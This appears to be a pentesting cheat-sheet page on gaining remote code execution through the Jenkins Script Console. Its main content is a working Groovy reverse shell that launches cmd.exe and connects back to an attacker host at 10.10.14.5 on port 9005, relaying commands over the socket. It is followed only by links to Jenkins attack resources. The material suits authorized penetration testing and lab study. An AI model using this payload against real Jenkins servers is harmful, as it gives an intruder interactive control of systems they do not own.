# 🕴 Jenkins

## RCE from Script Console

> From [frohoff/**revsh.groovy**](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)****

```bash
String host="10.10.14.5";
int port=9005;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Resources

{% embed url="https://github.com/gquere/pwn_jenkins" %}

{% embed url="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security" %}
